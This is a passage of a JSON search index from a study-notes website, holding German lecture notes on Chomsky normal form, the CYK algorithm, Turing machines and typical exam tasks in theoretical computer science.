Normalform","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#thema-7-chomsky-normalform-cnf","title":"Thema 7: Chomsky-Normalform (CNF)","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#definition","title":"\ud83d\udccc Definition:","text":"<p>Eine Grammatik ist in Chomsky-Normalform (CNF), wenn jede Produktionsregel eine der folgenden Formen hat:</p> <ol> <li> <p>Binarregel:</p> <p>A\u2192BCA \\rightarrow BCA\u2192BC - A, B, C: Nichtterminalsymbole (B, C \u2260 Startsymbol) - Keine Terminals auf der rechten Seite. 2. Terminalregel:</p> <p>A\u2192aA \\rightarrow aA\u2192a - a: Terminalsymbol (z.B. <code>a</code>, <code>b</code>, <code>c</code>) 3. Leere Produktion (optional):</p> <p>S\u2192\u03b5S \\rightarrow \\varepsilonS\u2192\u03b5 - Nur erlaubt, wenn S das Startsymbol ist.</p> </li> </ol>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#schritte-zur-umwandlung-in-cnf","title":"\ud83d\udcdd Schritte zur Umwandlung in CNF:","text":"<ol> <li> <p>Eliminiere \u03b5-Produktionen:</p> <ul> <li>Entferne Regeln der Form <code>A \u2192 \u03b5</code>, au\u00dfer wenn <code>A</code> das Startsymbol ist.</li> <li> <p>Eliminiere unit-Productions:</p> </li> <li> <p>Regeln der Form <code>A \u2192 B</code> werden aufgel\u00f6st, indem <code>A</code> die Regeln von <code>B</code> \u00fcbernimmt.</p> </li> <li> <p>Eliminiere unn\u00f6tige Symbole:</p> </li> <li> <p>Entferne Nichtterminale, die nicht zur Erzeugung von Terminals f\u00fchren.</p> </li> <li> <p>Reduziere l\u00e4ngere Produktionen:</p> </li> <li> <p>Z.B. <code>A \u2192 BCD</code> wird umgewandelt in:</p> <p><code>A \u2192 BX X \u2192 CD</code></p> </li> </ul> </li> <li> <p>Ersetze Terminals in Kombinationen:</p> <ul> <li> <p>Z.B. <code>A \u2192 aB</code> wird:</p> <p><code>A \u2192 XB X \u2192 a</code></p> </li> </ul> </li> </ol> <p></p>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#2-cyk-algorithmus-cocke-younger-kasami","title":"\ud83d\udcca 2. CYK-Algorithmus (Cocke-Younger-Kasami)","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#zweck","title":"\ud83d\udccc Zweck:","text":"<p>Pr\u00fcft, ob ein Wort von einer Grammatik in CNF erzeugt werden kann.</p>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#voraussetzungen","title":"\ud83d\udcdd Voraussetzungen:","text":"<ul> <li>Die Grammatik muss in CNF vorliegen.</li> <li>Das Wort <code>\u03c9</code> wird von unten nach oben in einer Tabelle \u00fcberpr\u00fcft.</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#ablauf-des-cyk-algorithmus","title":"\u2699\ufe0f Ablauf des CYK-Algorithmus:","text":"<ol> <li> <p>Initialisierung (Basis):</p> <ul> <li>Erstelle eine Dreiecksmatrix.</li> <li>F\u00fclle die unterste Zeile mit den Nichtterminals, die das jeweilige Terminal ableiten.</li> <li> <p>Rekursive Berechnung:</p> </li> <li> <p>F\u00fcr jedes Teilwort (l\u00e4nger als 1) pr\u00fcfe, welche Kombination von Nichtterminals m\u00f6glich ist.</p> </li> <li>Nutze die Produktionsregeln der Grammatik.</li> <li> <p>Akzeptanzpr\u00fcfung:</p> </li> <li> <p>Das Wort wird akzeptiert, wenn das Startsymbol (S) in der oberen Zelle der Matrix steht.</p> </li> </ul> </li> </ol> <p></p>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#3-typische-prufungsaufgaben","title":"\ud83d\udd0d 3. Typische Pr\u00fcfungsaufgaben","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#aufgabe-1-grammatik-in-cnf-umwandeln","title":"\u2705 Aufgabe 1: Grammatik in CNF umwandeln","text":"<ul> <li> <p>Beispiel:</p> <p><code>S \u2192 FF | FG F \u2192 aHa G \u2192 bb H \u2192 bHb | \u03b5</code></p> </li> <li> <p>Vorgehen:</p> <ol> <li>Ersetze Terminals: <code>aHa \u2192 XHY</code> mit <code>X \u2192 a</code>, <code>Y \u2192 a</code></li> <li>Reduziere lange Produktionen: <code>S \u2192 FX</code> mit <code>X \u2192 FG</code></li> <li>Eliminiere \u03b5-Produktionen: <code>H \u2192 bHb | \u03b5</code> wird angepasst.</li> </ol> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#aufgabe-2-cyk-fur-cccabb","title":"\u2705 Aufgabe 2: CYK f\u00fcr <code>cccabb</code>","text":"<ul> <li>Erstelle eine Tabelle f\u00fcr das Wort <code>cccabb</code>.</li> <li>Pr\u00fcfe jede Kombination mit den Produktionsregeln.</li> <li>Akzeptanz: Falls <code>S</code> in der oberen Zelle \u2192 Wort geh\u00f6rt zur Sprache.</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#aufgabe-3-cyk-fur-ababacc","title":"\u2705 Aufgabe 3: CYK f\u00fcr <code>ababacc</code>","text":"<ul> <li>Gleiche Vorgehensweise wie bei Aufgabe 2.</li> <li>Grammatik ist bereits in CNF \u2192 direkt anwenden.</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/6.%20Chomsky-Normalform/#4-zusammenfassung","title":"\ud83c\udfaf 4. Zusammenfassung","text":"<ul> <li>Chomsky-Normalform: Grammatik in einfache Bin\u00e4rform umwandeln.</li> <li>CYK-Algorithmus: Matrixverfahren, um die Ableitbarkeit eines Wortes zu pr\u00fcfen.</li> <li>Pr\u00fcfung: Immer kontrollieren, ob das Startsymbol <code>S</code> in der letzten Matrixzelle steht.</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/7.%20Turing%20Maschine/","title":"7. Turing Maschine","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/7.%20Turing%20Maschine/#thema-8-turing-maschine-kontextsensitive-grammatik","title":"Thema 8: Turing-Maschine &amp; Kontextsensitive Grammatik","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/7.%20Turing%20Maschine/#1-turing-maschine-tm-grundlagen","title":"\ud83d\ude80 1. Turing-Maschine (TM) - Grundlagen","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/7.%20Turing%20Maschine/#definition","title":"\ud83d\udccc Definition:","text":"<p>Eine Turing-Maschine (TM) ist ein abstraktes Berechnungsmodell, das \u00fcber eine unendliche Bandstruktur arbeitet und zur Definition der Berechenbarkeit genutzt wird.</p>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/7.%20Turing%20Maschine/#bestandteile","title":"\ud83d\udee0\ufe0f Bestandteile:","text":"<ul> <li> <p>Band (<code>\u221e</code> in beide Richtungen): Unendlich lang, speichert Eingabe und Zwischenzust\u00e4nde.</p> </li> <li> <p>Lese-/Schreibkopf: Kann Zeichen lesen, \u00fcberschreiben und sich bewegen (<code>L</code> = Links, <code>R</code> = Rechts).</p> </li> <li> <p>Zustandsmenge <code>**Q**</code>: Menge von Zust\u00e4nden inklusive eines Startzustands <code>**q_0**</code> und eines Haltezustands <code>**q_h**</code>.</p> </li> <li> <p>\u00dcbergangsfunktion <code>\u03b4</code>: Bestimmt f\u00fcr jede Kombination von aktuellem Zustand und gelesenem Zeichen die neue Bandbeschriftung, Bewegung, und den Folgezustand.</p> </li> </ul> <p>Formal: </p> <ul> <li> <p><code>\u03a3</code> = Eingabealphabet (ohne das Blank-Zeichen <code>\u2294</code>),</p> </li> <li> <p><code>\u0393</code> = Bandalphabet (inklusive <code>\u2294</code>),</p> </li> <li> <p><code>\u03b4</code> = \u00dcbergangsfunktion: <code>Q \u00d7 \u0393 \u2192 Q \u00d7 \u0393 \u00d7 {L, R}</code>.</p> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/7.%20Turing%20Maschine/#2-arbeitsweise-einer-tm","title":"\ud83d\udcca 2. Arbeitsweise einer TM","text":"<ol> <li> <p>Start: TM beginnt im Startzustand <code>**q_0**</code> und liest das erste Zeichen auf dem Band.</p> </li> <li> <p>\u00dcbergangsfunktion <code>**\u03b4**</code> wendet Regeln an:</p> <ul> <li> <p>Bandinhalt \u00e4ndern (\u00dcberschreiben eines Symbols).</p> </li> <li> <p>Kopf bewegen (nach Links oder Rechts).</p> </li> <li> <p>Neuen Zustand annehmen (wechseln in <code>Q</code>).</p> </li> </ul> </li> <li> <p>Haltbedingung: TM stoppt, wenn sie in <code>q_h</code> \u00fcbergeht oder keine g\u00fcltigen \u00dcberg\u00e4nge mehr existieren.</p> </li> </ol>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/7.%20Turing%20Maschine/#3-beispiel-einer-einfachen-tm-fur-l-anbn-n-1","title":"\ud83d\udd04 3. Beispiel einer einfachen TM f\u00fcr L = { a\u207fb\u207f | n \u2265 1 }","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/7.%20Turing%20Maschine/#ubergangsregeln","title":"\u00dcbergangsregeln:","text":"<p><code>#</code> = leer <code>N</code> = Lesekopf Neutral Richtung <code>L, R</code> = Lesekopf Links, Rechts Richtung <code>a(#,N</code>) = 1. Element zu lesend, 2. Element ersetzen mit, 3. Element Lesekopf Richtung</p> <p></p>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/7.%20Turing%20Maschine/#4-zusammenhang-zur-chomsky-hierarchie","title":"\ud83d\udd17 4. Zusammenhang zur Chomsky-Hierarchie","text":"<ul> <li> <p>Regul\u00e4re Sprachen (Typ-3) \u2192 Endliche Automaten (DFA, NFA)</p> </li> <li> <p>Kontextfreie Sprachen (Typ-2) \u2192 Kellerautomaten (PDA)</p> </li> <li> <p>Kontextsensitive Sprachen (Typ-1) \u2192 Linear beschr\u00e4nkte TM</p> </li> <li> <p>Rekursiv aufz\u00e4hlbare Sprachen (Typ-0) \u2192 Turing-Maschinen (volle Berechenbarkeit)</p> </li> </ul> <p>\u27a1\ufe0f Turing-Maschinen sind m\u00e4chtiger als alle anderen Modelle, da sie jede berechenbare Funktion simulieren k\u00f6nnen.</p>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/7.%20Turing%20Maschine/#5-typische-prufungsaufgaben","title":"\ud83d\udcdd 5. Typische Pr\u00fcfungsaufgaben","text":"<ol> <li> <p>Konstruieren einer TM f\u00fcr eine gegebene Sprache (z. B. Palindrome oder einfache arithmetische Operationen).</p> </li> <li> <p>Entscheidbarkeit von Problemen analysieren (z. B. Halteproblem ist nicht entscheidbar).</p> </li> <li> <p>\u00dcbergangsfunktion einer TM angeben und simulieren.</p> </li> </ol> <p>Falls du ein Beispiel detaillierter durchgehen m\u00f6chtest, sag einfach Bescheid! \ud83d\ude0a\ud83d\ude80</p>","tags":["Course/"]}]}